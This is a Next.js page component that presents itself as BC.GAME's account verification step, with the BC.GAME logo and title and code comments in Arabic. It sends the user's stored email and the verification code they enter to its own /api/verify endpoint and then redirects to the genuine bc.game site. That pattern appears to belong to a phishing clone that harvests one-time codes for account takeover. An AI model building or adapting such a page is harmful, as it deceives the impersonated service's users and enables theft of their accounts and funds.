"use client";

import Head from "next/head";
import styles from "@/styles/verify.module.css";
import logo from "@/assets/logo.webp";
import Image from "next/image";
import Link from "next/link";
import React, { useEffect, useState } from "react";
import { useRouter } from "next/navigation";

const VerifyPage = () => {
  const router = useRouter();
  const [verificationCode, setVerificationCode] = useState("");
  const [userEmail, setUserEmail] = useState("");

  useEffect(() => {
    if (typeof window !== "undefined") {
      const storedEmail = localStorage.getItem("userEmailForVerification");
      if (storedEmail) {
        setUserEmail(storedEmail);
      }
    }
  }, []);

  const handleSubmit = async () => {
    try {
      const response = await fetch("/api/verify", {
        // بافتراض أن router.js موجود في /api/verify
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          email: userEmail, // أرسل البريد الإلكتروني
          verify: verificationCode, // أرسل رمز التحقق
        }),
      });

      const data = await response.json();

      if (response.ok) {
        alert(data.message);
        router.push("https://bc.game/");
      } else {
        alert(data.message);
      }
    } catch (error) {
      console.error("خطأ في التحقق:", error);
      alert("حدث خطأ أثناء التحقق.");
    }
  };

  return (
    <div className={styles.container}>
      <Head>
        <title>Verify - BC.GAME</title>
      </Head>

      <main className={styles.mainContent}>
        <div className={styles.verificationCard}>
          <div className={styles.headerLogo}>
            <Image src={logo} alt="BC.GAME Logo" className={styles.logoImage} />
          </div>

          <h1 className={styles.title}>Verify Your Account</h1>
          <p className={styles.description}>
            We've sent a verification code to your email address. Please enter
            the code below to complete the verification process.
          </p>

          <div className={styles.inputGroup}>
            <input
              type="text"
              placeholder="Enter Verification Code Here"
              className={styles.verificationCodeInput}
              value={verificationCode}
              onChange={(e) => setVerificationCode(e.target.value)}
            />
          </div>

          <button className={styles.submitButton} onClick={handleSubmit}>
            <span className={styles.submitButtonSpan}>Verify Now</span>
          </button>

          <div className={styles.linksSection}>
            <p className={styles.resendText}>
              Didn't receive the code?{" "}
              <a href="/verify" className={styles.resendLink}>
                Resend Code
              </a>
            </p>
            <Link href="/" className={styles.backLink}>
              Back to Login
            </Link>
          </div>
        </div>
      </main>
    </div>
  );
};

export default VerifyPage;
